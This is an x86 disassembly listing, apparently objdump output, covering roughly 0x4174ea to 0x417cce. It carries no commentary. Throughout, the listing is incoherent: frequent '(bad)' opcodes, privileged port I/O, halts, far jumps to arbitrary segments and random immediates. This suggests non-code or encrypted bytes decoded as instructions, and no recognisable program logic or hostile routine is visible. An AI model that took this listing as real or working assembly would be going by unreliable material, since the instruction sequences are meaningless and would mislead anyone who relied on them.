  4174ea:	fadd   st(2),st
  4174ec:	hlt    
  4174ed:	cmp    DWORD PTR [esi-0x5d9efe35],0xffffffbe
  4174f4:	xor    edx,edx
  4174f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174f7:	in     eax,0x25
  4174f9:	(bad)  
  4174fa:	and    eax,0xe10a314b
  4174ff:	mov    dh,0x26
  417501:	popa   
  417502:	or     BYTE PTR [eax],ah
  417504:	fcom   DWORD PTR [ecx-0x3c]
  417507:	das    
  417508:	pushf  
  417509:	out    0xea,al
  41750b:	mov    ch,BYTE PTR [ebx]
  41750d:	mov    bh,0xc7
  41750f:	sub    cl,BYTE PTR [ebx+0x6a]
  417512:	mov    ch,BYTE PTR [ebx+ebp*2+0x7eee5f8a]
  417519:	sub    bl,bl
  41751b:	ds push cs
  41751d:	jl     0x4174e8
  41751f:	das    
  417520:	jmp    0x41750d
  417522:	xchg   ebx,eax
  417523:	add    al,0xd2
  417525:	lods   al,BYTE PTR ds:[esi]
  417526:	dec    ebx
  417527:	add    BYTE PTR fs:0x5d4e38b,bl
  41752e:	push   edi
  41752f:	fcomip st,st(6)
  417531:	xchg   esi,eax
  417532:	fwait
  417533:	adc    esp,DWORD PTR [eax+0x7161f50]
  417539:	cld    
  41753a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41753b:	popa   
  41753c:	mov    eax,DWORD PTR [esi+0x4a85a036]
  417542:	jecxz  0x4175b4
  417544:	inc    esp
  417545:	test   ax,0x140f
  417549:	outs   dx,DWORD PTR ds:[esi]
  41754a:	cmp    dh,BYTE PTR [ebx-0x47]
  41754d:	sbb    al,0x0
  41754f:	(bad)  
  417550:	stc    
  417551:	aas    
  417552:	je     0x417527
  417554:	jmp    0xb240:0x69f912f6
  41755b:	sahf   
  41755c:	loope  0x4175d0
  41755e:	in     al,dx
  41755f:	pop    es
  417560:	sbb    edi,0xffffff8f
  417563:	mov    ds,WORD PTR [esi-0x6bf0c338]
  417569:	imul   ebx,DWORD PTR [esi],0x41
  41756c:	add    ch,BYTE PTR [edi]
  41756e:	(bad)  
  417570:	mov    bl,0xce
  417572:	test   al,0x5d
  417574:	and    eax,0x5d005d31
  417579:	nop
  41757a:	lea    ecx,[ecx]
  41757c:	jp     0x417561
  41757e:	aas    
  41757f:	pop    ds
  417580:	aad    0xbb
  417582:	pop    ds
  417583:	jo     0x41753d
  417585:	popa   
  417586:	sbb    ebx,DWORD PTR [esp+ecx*1-0x4952b906]
  41758d:	xchg   ebx,eax
  41758e:	push   edi
  41758f:	lods   eax,DWORD PTR ds:[esi]
  417590:	xlat   BYTE PTR ds:[ebx]
  417591:	mov    ah,0x34
  417593:	dec    edx
  417594:	std    
  417595:	sbb    BYTE PTR [edi+ebx*8],ch
  417598:	add    DWORD PTR [ebx-0x4f78907a],ebp
  41759e:	jle    0x4175ab
  4175a0:	dec    ecx
  4175a1:	jg     0x4175c7
  4175a3:	mov    edi,DWORD PTR [edx+eax*8-0x5bd2ebb7]
  4175aa:	cld    
  4175ab:	cli    
  4175ac:	outs   dx,DWORD PTR ds:[esi]
  4175ad:	sar    BYTE PTR [ebx+edx*8],1
  4175b0:	retf   0xb8d7
  4175b3:	fs into 
  4175b5:	aaa    
  4175b6:	add    bl,BYTE PTR [ecx+ebp*1]
  4175b9:	stos   BYTE PTR es:[edi],al
  4175ba:	push   ss
  4175bb:	sub    cl,0x37
  4175be:	cmp    dh,BYTE PTR [eax-0x77906380]
  4175c4:	pop    ebp
  4175c5:	icebp  
  4175c6:	xlat   BYTE PTR ds:[ebx]
  4175c7:	jecxz  0x41755f
  4175c9:	adc    cl,BYTE PTR [edi+0x7b4f1fea]
  4175cf:	rcl    DWORD PTR [ecx+0x406a5813],cl
  4175d5:	sub    BYTE PTR [edx+esi*8+0x3a10178b],ah
  4175dc:	adc    dl,BYTE PTR [edi+eiz*2]
  4175df:	mov    ds:0xec667787,eax
  4175e4:	sbb    DWORD PTR [ecx],ebp
  4175e6:	and    al,0x5b
  4175e8:	jg     0x41763b
  4175ea:	(bad)  
  4175eb:	xor    DWORD PTR [edx+0x5cd35525],eax
  4175f1:	sbb    eax,0x351cae90
  4175f6:	icebp  
  4175f7:	sbb    BYTE PTR [ecx-0x18],cl
  4175fa:	call   0x7c0d:0xa47624d0
  417601:	push   ss
  417602:	mov    WORD PTR [edx],?
  417604:	push   esp
  417605:	ficomp WORD PTR [edi+0x70]
  417608:	mov    al,0x86
  41760a:	push   ss
  41760b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41760c:	repz cld 
  41760e:	jnp    0x4175e0
  417610:	(bad)  
  417611:	xchg   edx,eax
  417612:	sbb    edi,ebx
  417614:	fisttp DWORD PTR cs:[ebp+0x2f]
  417618:	mov    dh,0x8a
  41761a:	ret    
  41761b:	test   BYTE PTR ds:0x11c63d29,dh
  417621:	(bad)  
  417622:	push   esi
  417623:	jnp    0x41763a
  417625:	sbb    eax,0x4c7efa84
  41762a:	dec    ecx
  41762b:	loope  0x417679
  41762d:	sti    
  41762e:	mov    dl,0x54
  417630:	test   BYTE PTR ds:0x89d1b38e,0x56
  417637:	enter  0x7f52,0x84
  41763b:	lahf   
  41763c:	jl     0x41761b
  41763e:	pop    edx
  41763f:	sub    edi,esi
  417641:	xchg   esi,eax
  417642:	ret    
  417643:	mov    WORD PTR [esi+0x4f],?
  417646:	adc    eax,0x7cbac3d2
  41764b:	pop    ss
  41764c:	ficom  WORD PTR [edx+0x1ee1978e]
  417652:	adc    BYTE PTR [ecx],ch
  417654:	jle    0x417624
  417656:	out    dx,al
  417657:	ret    
  417658:	and    al,0x8
  41765a:	xor    bh,ch
  41765c:	cmp    edx,edi
  41765e:	adc    al,0x80
  417660:	pop    es
  417661:	mov    edx,0x996d179f
  417666:	xchg   esp,eax
  417667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417668:	bound  ebp,QWORD PTR [ebx+ebp*2]
  41766b:	out    dx,eax
  41766c:	fiadd  DWORD PTR [edx-0x6a]
  41766f:	push   edi
  417670:	mov    bh,0x9c
  417672:	xor    ah,bl
  417674:	inc    ebp
  417675:	imul   esp,DWORD PTR [edx+0x520a882],0x558be75f
  41767f:	push   0x425a23d8
  417684:	repz or DWORD PTR [ebx],eax
  417687:	cli    
  417688:	setbe  ah
  41768b:	daa    
  41768c:	mov    bl,dl
  41768e:	push   eax
  41768f:	push   eax
  417690:	(bad)  
  417691:	push   ebp
  417692:	cmp    ebx,0xffffffb8
  417695:	gs xor ebx,esp
  417698:	ret    
  417699:	xchg   DWORD PTR [ebx-0x36637b3c],esp
  41769f:	mov    ds:0x784f9d06,eax
  4176a4:	or     ah,cl
  4176a6:	push   ebx
  4176a7:	or     dh,BYTE PTR [esi+0x6a2fdd94]
  4176ad:	xor    ah,BYTE PTR [edx+0x3d]
  4176b0:	fild   WORD PTR [esi+0x16b22368]
  4176b6:	xlat   BYTE PTR ds:[ebx]
  4176b7:	stos   BYTE PTR es:[edi],al
  4176b8:	outs   dx,DWORD PTR ds:[esi]
  4176b9:	gs jmp 0x41764a
  4176bc:	sbb    eax,0x307951b9
  4176c1:	push   eax
  4176c2:	cmp    eax,0x97bb4742
  4176c7:	dec    ebx
  4176c8:	mov    esi,0x70519b4e
  4176cd:	pop    ecx
  4176ce:	scas   eax,DWORD PTR es:[edi]
  4176cf:	and    DWORD PTR [esi+0x14],0x4
  4176d3:	in     eax,0xc2
  4176d5:	lods   eax,DWORD PTR ds:[esi]
  4176d6:	and    al,0xb1
  4176d8:	mov    ebx,0x1fc97938
  4176dd:	or     DWORD PTR [edx],eax
  4176df:	jge    0x417673
  4176e1:	daa    
  4176e2:	mov    ebp,0xb3a7bb6e
  4176e7:	ins    BYTE PTR es:[edi],dx
  4176e8:	push   edx
  4176e9:	mov    al,ds:0xec29b92f
  4176ee:	loop   0x4176b6
  4176f0:	rcr    BYTE PTR cs:[edi-0x11a6b355],1
  4176f7:	sub    eax,0x9017fd4a
  4176fc:	jo     0x417705
  4176fe:	in     al,dx
  4176ff:	popf   
  417700:	mov    esp,eax
  417702:	loopne 0x41777d
  417704:	retf   
  417705:	fcomi  st,st(1)
  417707:	in     al,0xbd
  417709:	imul   ecx,esi,0x3945c517
  41770f:	cmp    al,bl
  417711:	pop    edi
  417712:	dec    edi
  417713:	cdq    
  417714:	mov    bl,0x67
  417716:	adc    eax,0xbf4ab774
  41771b:	and    BYTE PTR [ebx+edi*8],bl
  41771e:	dec    eax
  41771f:	push   es
  417720:	sub    al,0xb2
  417722:	repz pop edi
  417724:	and    eax,0xcabc4e3f
  417729:	push   0x890e7788
  41772e:	aam    0xb6
  417730:	jmp    0x41778c
  417732:	fiadd  DWORD PTR [edx]
  417734:	lahf   
  417735:	test   BYTE PTR [ecx-0x2b19a78],bh
  41773b:	ja     0x4176e2
  41773d:	jae    0x41776e
  41773f:	ds out 0xab,eax
  417742:	mov    esp,0xfa756ad8
  417747:	xor    DWORD PTR [ebp+ebx*4+0x5ab97249],ebx
  41774e:	aad    0xbc
  417750:	adc    BYTE PTR [eax],bl
  417752:	and    eax,0x7b14fdf2
  417757:	mov    al,0xbc
  417759:	mov    edi,0xdab11dbb
  41775e:	(bad)  
  41775f:	sub    eax,0x3188421b
  417764:	ins    BYTE PTR es:[edi],dx
  417765:	xor    ebp,ebx
  417767:	sub    BYTE PTR [ebx],bh
  417769:	and    bl,BYTE PTR ds:0x151caf35
  41776f:	shr    DWORD PTR [ebx+0x4e],1
  417772:	lods   eax,DWORD PTR ds:[esi]
  417773:	or     DWORD PTR [eax-0x1fcd1362],0x796b98f9
  41777d:	adc    BYTE PTR [esi],bl
  41777f:	inc    edi
  417780:	loopne 0x4177ac
  417782:	mov    al,ds:0xe4d73400
  417787:	or     eax,0x8e45aca3
  41778c:	add    eax,0x87a8d7cd
  417791:	xchg   ebx,eax
  417792:	cli    
  417793:	mov    cl,0x65
  417795:	aaa    
  417796:	(bad)  
  417797:	adc    BYTE PTR [eax-0x40],ah
  41779a:	dec    edi
  41779b:	ret    
  41779c:	mov    esp,?
  41779e:	fs cmps BYTE PTR es:[esi],BYTE PTR es:[edi]
  4177a1:	clc    
  4177a2:	dec    ecx
  4177a3:	xchg   ecx,eax
  4177a4:	adc    eax,0x10bd14b
  4177a9:	cmp    al,0x3d
  4177ab:	std    
  4177ac:	stc    
  4177ad:	imul   esi,DWORD PTR [ecx-0x4f],0xbf541175
  4177b4:	in     al,0x86
  4177b6:	dec    edi
  4177b7:	sbb    bh,bh
  4177b9:	pop    ecx
  4177ba:	jb     0x4177bd
  4177bc:	xor    DWORD PTR [ebp-0x3619af3],edi
  4177c2:	push   esi
  4177c3:	icebp  
  4177c4:	out    dx,eax
  4177c5:	pop    ds
  4177c6:	mov    al,0x58
  4177c8:	nop
  4177c9:	(bad)  
  4177ca:	aas    
  4177cb:	adc    al,BYTE PTR [ebp+0x31]
  4177ce:	push   ebp
  4177cf:	and    DWORD PTR [edi+0x4051671],ecx
  4177d5:	ja     0x4177f9
  4177d7:	icebp  
  4177d8:	cmp    BYTE PTR [edx+0x28],0x74
  4177dc:	loopne 0x417851
  4177de:	pop    ss
  4177df:	sub    DWORD PTR [esp+eax*2],ebp
  4177e2:	inc    edi
  4177e3:	stos   DWORD PTR es:[edi],eax
  4177e4:	jmp    0x4177a5
  4177e6:	not    BYTE PTR [edx]
  4177e8:	mov    edi,0xb5ebad1b
  4177ed:	jns    0x417849
  4177ef:	cs jp  0x417820
  4177f2:	jge    0x417806
  4177f4:	jp     0x4177d8
  4177f6:	pop    es
  4177f7:	fbld   TBYTE PTR [ecx+0x26]
  4177fa:	repz xor eax,0x59c7085e
  417800:	or     BYTE PTR [ecx],dh
  417802:	mov    eax,DWORD PTR [ebx-0x52]
  417805:	or     eax,0x2047fccb
  41780a:	sub    DWORD PTR [ebp-0x73],ebx
  41780d:	(bad)  
  41780f:	aad    0x32
  417811:	popa   
  417812:	jbe    0x4177a0
  417814:	rcl    BYTE PTR [eax],1
  417816:	iret   
  417817:	ins    DWORD PTR es:[edi],dx
  417818:	clc    
  417819:	ret    0x58fd
  41781c:	or     ebx,DWORD PTR [ecx+0x229a1169]
  417822:	cmp    al,BYTE PTR [ecx+0x1d]
  417825:	call   0x5a08ab18
  41782a:	shr    DWORD PTR [ebx],1
  41782c:	adc    eax,0xeb9bae80
  417831:	fistp  WORD PTR [ebx+0x5510aac5]
  417837:	cmp    dh,BYTE PTR [ebx+0x7f]
  41783a:	sub    dh,BYTE PTR [edx+edi*1+0x4b]
  41783e:	ss jl  0x417814
  417841:	or     BYTE PTR [ecx-0x64d33b1e],0x5d
  417848:	adc    bh,0x9b
  41784b:	xchg   ebp,eax
  41784c:	std    
  41784d:	inc    esi
  41784e:	add    ah,bl
  417850:	jns    0x41781d
  417852:	mov    WORD PTR [ecx-0xe7802fc],cs
  417858:	mov    ds:0xa70fa4ec,al
  41785d:	mov    al,0x9c
  41785f:	dec    edx
  417860:	loop   0x4178dc
  417862:	jle    0x41788a
  417864:	jno    0x41781c
  417866:	add    ch,bl
  417868:	scas   al,BYTE PTR es:[edi]
  417869:	(bad)
  41786c:	mov    dl,0x89
  41786e:	xlat   BYTE PTR fs:[ebx]
  417870:	push   esp
  417871:	adc    BYTE PTR [eax],al
  417873:	jo     0x417820
  417875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417876:	test   al,0xcc
  417878:	push   ds
  417879:	mov    dl,0x5a
  41787b:	mov    ch,ch
  41787d:	or     ah,BYTE PTR ds:[edx]
  417880:	fld    QWORD PTR [eax-0x4b]
  417883:	(bad)  
  417884:	xor    al,0xd7
  417886:	sbb    DWORD PTR [ecx-0x37683c70],0x69744fc4
  417890:	js     0x41786d
  417892:	addr16 jb 0x417913
  417895:	xlat   BYTE PTR ds:[ebx]
  417896:	call   0xdf2e:0x8515b080
  41789d:	mov    WORD PTR [edx],fs
  41789f:	jmp    0xc9be:0xd741c631
  4178a6:	cwde   
  4178a7:	daa    
  4178a8:	int    0x44
  4178aa:	(bad)  
  4178ab:	pop    ss
  4178ac:	loope  0x4178e5
  4178ae:	retf   0x49e
  4178b1:	stos   DWORD PTR es:[edi],eax
  4178b2:	jb     0x41789a
  4178b4:	xor    al,0x51
  4178b6:	loopne 0x4178c1
  4178b8:	jle    0x417929
  4178ba:	adc    BYTE PTR [esi-0x10e45702],cl
  4178c0:	jg     0x4178b5
  4178c2:	data16 xchg BYTE PTR [ebx],ah
  4178c5:	mov    al,ds:0x637aec1e
  4178ca:	arpl   WORD PTR [ecx],bx
  4178cc:	pop    ds
  4178cd:	popa   
  4178ce:	aam    0xea
  4178d0:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4178d2:	ror    ch,1
  4178d4:	lock xor eax,0x44398024
  4178da:	add    eax,0xa4e0519
  4178df:	sbb    ch,bh
  4178e1:	stos   BYTE PTR es:[edi],al
  4178e2:	mov    edx,0x122be2c7
  4178e7:	inc    eax
  4178e8:	mov    ds:0x870b2455,eax
  4178ed:	xor    cl,dl
  4178ef:	inc    eax
  4178f0:	loop   0x417927
  4178f2:	pop    edx
  4178f3:	out    0x31,eax
  4178f5:	and    BYTE PTR [edx-0x25],ch
  4178f8:	mov    ss,esp
  4178fa:	ja     0x41791f
  4178fc:	test   ch,ch
  4178fe:	call   0x7b889e0
  417903:	scas   al,BYTE PTR es:[di]
  417905:	outs   dx,DWORD PTR ds:[esi]
  417906:	ss cli 
  417908:	loopne 0x4178eb
  41790a:	jmp    0x41796e
  41790c:	shl    BYTE PTR [eax-0x5ababf10],0xf6
  417913:	shl    ah,0x10
  417916:	cmp    bh,BYTE PTR [edi]
  417918:	enter  0x825b,0xde
  41791c:	mov    ds:0xd4e09ab9,eax
  417921:	test   al,0x2c
  417923:	aad    0xd3
  417925:	sub    dh,BYTE PTR [ebx+edi*2]
  417928:	test   BYTE PTR [edi],0x40
  41792b:	xor    DWORD PTR [ebp+ebp*2-0x13],ebp
  41792f:	aam    0x21
  417931:	fstp   TBYTE PTR [ebx+0x79a985fe]
  417937:	cli    
  417938:	cmc    
  417939:	ins    BYTE PTR es:[edi],dx
  41793a:	push   esp
  41793b:	mov    BYTE PTR [edx],dl
  41793d:	pop    DWORD PTR [ecx+0x38]
  417940:	xchg   edi,eax
  417941:	fldenv [edx-0x57ab4dc4]
  417947:	into   
  417948:	pop    esp
  417949:	push   ds
  41794a:	mov    esp,0xceedbd23
  41794f:	aas    
  417950:	fucom  st(4)
  417952:	sub    esi,eax
  417954:	push   ebp
  417955:	jge    0x417949
  417957:	xchg   DWORD PTR [ebp-0x5d],esp
  41795a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41795b:	xchg   esp,eax
  41795c:	shl    ebp,1
  41795e:	dec    ecx
  41795f:	jmp    FWORD PTR [eax+0x6d]
  417962:	cmp    DWORD PTR [ebx],edx
  417964:	rcr    BYTE PTR [ecx+esi*2-0x13],cl
  417968:	neg    BYTE PTR [ecx]
  41796a:	xor    cl,dl
  41796c:	inc    esp
  41796d:	in     eax,0xbe
  41796f:	or     dl,ah
  417971:	inc    eax
  417972:	pop    es
  417973:	sbb    al,BYTE PTR [edx-0x62330746]
  417979:	sub    DWORD PTR [bx+si-0x63],0x30491b86
  417981:	sti    
  417982:	jmp    0x4179ec
  417984:	ins    BYTE PTR es:[edi],dx
  417985:	rcl    BYTE PTR [ecx+0x59],1
  417988:	push   esp
  417989:	jno    0x417993
  41798b:	out    dx,eax
  41798c:	pop    ebx
  41798d:	shl    cl,cl
  41798f:	outs   dx,WORD PTR ds:[esi]
  417991:	dec    ebx
  417992:	call   0x3b20362f
  417997:	xor    edi,DWORD PTR [edi+ebx*4]
  41799a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41799b:	mov    BYTE PTR [eax+0x70],0xd
  41799f:	sub    ch,BYTE PTR [eax+0x3c1b98ff]
  4179a5:	cmp    al,0x6
  4179a7:	add    cl,BYTE PTR [ecx+0x75]
  4179aa:	shl    edx,cl
  4179ac:	out    dx,al
  4179ad:	push   ss
  4179ae:	rcr    DWORD PTR [eax-0x16bd8f00],cl
  4179b4:	sbb    DWORD PTR [ecx+0xf],esi
  4179b7:	dec    esi
  4179b8:	ja     0x417a1a
  4179ba:	shr    BYTE PTR [ebx+0x7d],1
  4179bd:	mov    esp,0xb6d31650
  4179c2:	sbb    BYTE PTR [ebx+0x3e535936],dl
  4179c8:	imul   ebx,ebx,0x452b1ec6
  4179ce:	out    0xfe,al
  4179d0:	test   bh,dh
  4179d2:	popa   
  4179d3:	xor    ebp,ebp
  4179d5:	and    DWORD PTR [ecx],edi
  4179d7:	mov    eax,ds:0xbea45707
  4179dc:	sbb    DWORD PTR [esi+0x3d],edi
  4179df:	bsf    esi,DWORD PTR [ecx-0x257c9dbe]
  4179e6:	pop    ebp
  4179e7:	repz cld 
  4179e9:	cmp    ebx,edi
  4179eb:	rcl    esi,cl
  4179ed:	mov    ebx,0x50d62a5
  4179f2:	cmc    
  4179f3:	jmp    0x7f498443
  4179f8:	pop    ss
  4179f9:	in     al,0xd1
  4179fb:	inc    esp
  4179fc:	jbe    0x417a6c
  4179fe:	inc    esp
  4179ff:	xor    al,0x94
  417a01:	fidivr DWORD PTR [ecx+ebp*2-0x79]
  417a05:	mov    bh,0xb3
  417a07:	sub    DWORD PTR [eax],edx
  417a09:	loopne 0x417a1a
  417a0b:	hlt    
  417a0c:	mov    cl,ch
  417a0e:	out    0xaf,eax
  417a10:	sub    DWORD PTR [edi-0x23],0xffffff8f
  417a14:	dec    ecx
  417a15:	shl    DWORD PTR [eax-0x4a],1
  417a18:	xchg   DWORD PTR [edi+ecx*8-0x461cf475],eax
  417a1f:	pop    esi
  417a20:	and    esp,DWORD PTR [edx+0x4]
  417a23:	pop    edx
  417a24:	mov    ch,0xb1
  417a26:	jmp    0x417a35
  417a28:	mov    ds:0xae9c4e97,eax
  417a2d:	sbb    dl,dl
  417a2f:	adc    eax,0x8a7efd40
  417a34:	scas   al,BYTE PTR es:[edi]
  417a35:	xchg   ebp,eax
  417a36:	cdq    
  417a37:	pop    esp
  417a38:	call   0x3ae72279
  417a3d:	xchg   BYTE PTR [ecx-0x57],cl
  417a40:	into   
  417a41:	jb     0x417a2e
  417a43:	and    DWORD PTR [eax-0x63131ed],ebp
  417a49:	sar    DWORD PTR [esi],0x9e
  417a4c:	nop
  417a4d:	sub    bh,BYTE PTR [ebp+0x7e1c94e8]
  417a53:	ja     0x417ab9
  417a55:	mov    ds:0x23f2aedb,eax
  417a5a:	test   al,0xa6
  417a5c:	inc    ecx
  417a5d:	pop    ds
  417a5e:	adc    ch,al
  417a60:	out    dx,al
  417a61:	jg     0x417aa3
  417a63:	sub    edx,DWORD PTR [esi+ecx*2]
  417a66:	cmp    DWORD PTR [edx-0x5c3c9f66],edi
  417a6c:	push   0x6a3791cd
  417a71:	adc    eax,0xf8dc3471
  417a76:	sbb    eax,0xcab13068
  417a7b:	iret   
  417a7c:	ins    BYTE PTR es:[edi],dx
  417a7d:	ficom  WORD PTR [eax+0x7ef02cd]
  417a83:	and    ecx,DWORD PTR [eax+0x2d2a52b6]
  417a89:	ss stc 
  417a8b:	loop   0x417a82
  417a8d:	test   DWORD PTR [edi+0x1f7476bc],edi
  417a93:	test   al,0x75
  417a95:	in     eax,0xad
  417a97:	jbe    0x417ab5
  417a99:	std    
  417a9a:	xor    al,0x44
  417a9c:	jb     0x417afa
  417a9e:	stos   DWORD PTR es:[edi],eax
  417a9f:	mov    ah,0x5b
  417aa1:	mov    dl,0x7d
  417aa3:	test   al,0xb4
  417aa5:	sub    ch,BYTE PTR [edi]
  417aa7:	mov    ecx,0x15beb0ab
  417aac:	add    al,0xf0
  417aae:	inc    edi
  417aaf:	xor    eax,DWORD PTR [edi-0x75]
  417ab2:	cmp    BYTE PTR [ecx+0x47254601],bh
  417ab8:	in     eax,0xca
  417aba:	push   edx
  417abb:	jae    0x417a44
  417abd:	jne    0x417ace
  417abf:	cdq    
  417ac0:	sar    DWORD PTR [ebp+edx*8+0x69],cl
  417ac4:	dec    ebx
  417ac5:	call   0xa35db80c
  417aca:	lods   eax,DWORD PTR ds:[esi]
  417acb:	lds    edi,FWORD PTR [edx+0x53]
  417ace:	jnp    0x417b17
  417ad0:	sbb    BYTE PTR [edi-0x5423a106],0x87
  417ad7:	add    esp,eax
  417ad9:	cs mov eax,0x18bcee91
  417adf:	mov    esi,0x60073f60
  417ae4:	cmp    bl,dl
  417ae6:	dec    ecx
  417ae7:	adc    WORD PTR [edx-0x2e],ax
  417aeb:	lods   al,BYTE PTR ds:[esi]
  417aec:	out    dx,al
  417aed:	jmp    0xb23fd395
  417af2:	call   0xc1fb1b18
  417af7:	push   eax
  417af8:	jno    0x417b39
  417afa:	push   ds
  417afb:	xchg   ecx,eax
  417afc:	dec    ebx
  417afd:	cld    
  417afe:	mov    eax,ds:0x929cbc3d
  417b03:	push   es
  417b04:	sbb    eax,0xcd50907e
  417b09:	lea    esp,[ebx]
  417b0b:	pop    ds
  417b0c:	mov    esi,0x4db69250
  417b11:	clc    
  417b12:	addr16 push esp
  417b14:	xor    eax,0x60eeaad9
  417b19:	push   eax
  417b1a:	or     ebx,DWORD PTR [ebp-0x41e4cef6]
  417b20:	sub    BYTE PTR [edx],ah
  417b22:	cmp    eax,0x82d68be9
  417b27:	addr16 mov al,0x52
  417b2a:	pop    edx
  417b2b:	addr16 popf 
  417b2d:	inc    ecx
  417b2e:	stos   BYTE PTR es:[edi],al
  417b2f:	jl     0x417b53
  417b31:	ja     0x417ad7
  417b33:	dec    ebp
  417b34:	shr    al,cl
  417b36:	fucomp st(6)
  417b38:	into   
  417b39:	mov    edi,0xf5f66810
  417b3e:	ret    0xf02c
  417b41:	mov    esi,0x1949e435
  417b46:	adc    eax,0x56136d47
  417b4b:	inc    edi
  417b4c:	gs xor ch,bh
  417b4f:	sub    ebp,DWORD PTR [ecx+0x45]
  417b52:	lock test BYTE PTR [ebx+0x3e],bl
  417b56:	push   edx
  417b57:	idiv   DWORD PTR [edx-0xaf1a2c6]
  417b5d:	(bad)  
  417b5e:	jmp    0xf2d1:0xfdb653fa
  417b65:	mov    esi,0xaeff7f48
  417b6a:	mov    ecx,0xb2d6b5cb
  417b6f:	loopne 0x417b1a
  417b71:	leave  
  417b72:	repz retf 
  417b74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b75:	sbb    esi,ebp
  417b77:	pop    eax
  417b78:	bswap  ebx
  417b7a:	push   ds
  417b7b:	sub    ebp,eax
  417b7d:	ja     0x417b22
  417b7f:	loopne 0x417b52
  417b81:	adc    eax,DWORD PTR [eax-0x175d6dbc]
  417b87:	dec    ebx
  417b88:	jp     0x417b0a
  417b8a:	js     0x417b89
  417b8c:	fstp   QWORD PTR [ebx-0x4a]
  417b8f:	ret    
  417b90:	mov    eax,ds:0xa49bcf24
  417b95:	les    esi,FWORD PTR [ecx]
  417b97:	and    eax,0x95f24524
  417b9c:	sbb    BYTE PTR [esi+edx*2-0x66],ch
  417ba0:	cmp    ecx,edx
  417ba2:	stc    
  417ba3:	mov    ds:0x783a7c15,eax
  417ba8:	loope  0x417c04
  417baa:	push   esp
  417bab:	fs retf 0xc563
  417baf:	(bad)  
  417bb0:	adc    dh,BYTE PTR [edi+0x20]
  417bb3:	test   BYTE PTR [edi],bh
  417bb5:	lahf   
  417bb6:	retf   0x2c57
  417bb9:	out    dx,eax
  417bba:	push   edx
  417bbb:	pop    edx
  417bbc:	fcomp  DWORD PTR [ebp-0x43]
  417bbf:	pandn  mm5,QWORD PTR [ecx+0x4a2f1767]
  417bc6:	aas    
  417bc7:	push   ebp
  417bc8:	mov    ebx,0x5d5c9db3
  417bcd:	dec    eax
  417bce:	jbe    0x417bc9
  417bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bd1:	ret    
  417bd2:	mov    ebx,0x5be0288e
  417bd7:	sbb    al,0x8a
  417bd9:	push   esi
  417bda:	adc    al,0xec
  417bdc:	xor    ebp,DWORD PTR [edi-0x3]
  417bdf:	adc    DWORD PTR [ecx+esi*2-0x1e8c5165],esi
  417be6:	outs   dx,DWORD PTR ds:[esi]
  417be7:	xor    DWORD PTR [edi+0x4e],0xffffffa0
  417beb:	sub    eax,0x5db2a63f
  417bf0:	push   0x75
  417bf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bf3:	iret   
  417bf4:	or     eax,0x8bf45888
  417bf9:	mov    ebx,cs
  417bfb:	(bad)  
  417bfc:	push   ss
  417bfd:	and    dl,BYTE PTR [ecx-0x6e]
  417c00:	fimul  WORD PTR [edx+0x28]
  417c03:	fidiv  DWORD PTR [ecx+edi*2+0x55]
  417c07:	push   ebx
  417c08:	imul   edi,ecx,0xb7eb9737
  417c0e:	pop    ecx
  417c0f:	and    BYTE PTR [ebx+0x72171921],ah
  417c15:	shl    bh,1
  417c17:	pop    ebp
  417c18:	leave  
  417c19:	and    eax,DWORD PTR [esi-0x719e09a1]
  417c1f:	retf   
  417c20:	cmp    eax,DWORD PTR [edx-0x46015e9d]
  417c26:	mov    al,0xf7
  417c28:	jmp    0x417c5d
  417c2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c2c:	data16 and BYTE PTR [ebx+0x5],0x17
  417c31:	fwait
  417c32:	addr16 inc ebp
  417c34:	test   eax,esp
  417c36:	jo     0x417c94
  417c38:	sub    BYTE PTR [ebx],al
  417c3a:	mov    bl,dl
  417c3c:	mov    ds:0x6c3074f9,eax
  417c41:	fbld   TBYTE PTR [esi+ebp*1+0x79b07dd6]
  417c48:	dec    edi
  417c49:	xor    eax,0xda67b8c4
  417c4e:	out    dx,eax
  417c4f:	pop    ds
  417c50:	popa   
  417c51:	sbb    eax,0x4b3500aa
  417c56:	mov    eax,ds:0x824938f0
  417c5b:	or     eax,0x2de16734
  417c60:	stos   BYTE PTR es:[edi],al
  417c61:	fld    TBYTE PTR [esi+0x15e9d1c0]
  417c67:	mov    ch,0x57
  417c69:	(bad)  
  417c6a:	fadd   DWORD PTR [esi-0x4b558b2]
  417c70:	gs mov es:0x20f3cbf4,ax
  417c78:	and    al,0xdc
  417c7a:	pop    es
  417c7b:	imul   ebp,DWORD PTR [edx+0x20],0x60
  417c7f:	out    0xf3,eax
  417c81:	(bad)  
  417c82:	in     eax,dx
  417c83:	jnp    0x417ce7
  417c85:	xor    ebx,edi
  417c87:	sbb    ecx,DWORD PTR [ebx-0x17]
  417c8a:	int    0xea
  417c8c:	lods   eax,DWORD PTR ds:[esi]
  417c8d:	xchg   ebx,eax
  417c8e:	mov    esi,0xc96579c3
  417c93:	pop    esi
  417c94:	shl    BYTE PTR [edi],0xb3
  417c97:	sub    bl,dl
  417c99:	adc    BYTE PTR ds:0xd1b3898a,al
  417c9f:	fadd   st(6),st
  417ca1:	mov    ecx,es
  417ca3:	mov    dh,0x53
  417ca5:	xor    dl,BYTE PTR [ecx-0x27ff2c5d]
  417cab:	add    esp,DWORD PTR [ecx+0x3b1e18dc]
  417cb1:	mov    ah,0xc6
  417cb3:	inc    esp
  417cb4:	dec    ebx
  417cb5:	push   eax
  417cb6:	aam    0xb1
  417cb8:	dec    edx
  417cb9:	aas    
  417cba:	lea    esp,[ecx]
  417cbc:	lods   al,BYTE PTR ds:[esi]
  417cbd:	daa    
  417cbe:	mov    ds:0xe5e1af02,al
  417cc3:	inc    eax
  417cc4:	mov    eax,0x895ffcc1
  417cc9:	mov    ebx,0x4b6513df
  417cce:	or     DWORD PTR [ebp+0x36],ecx
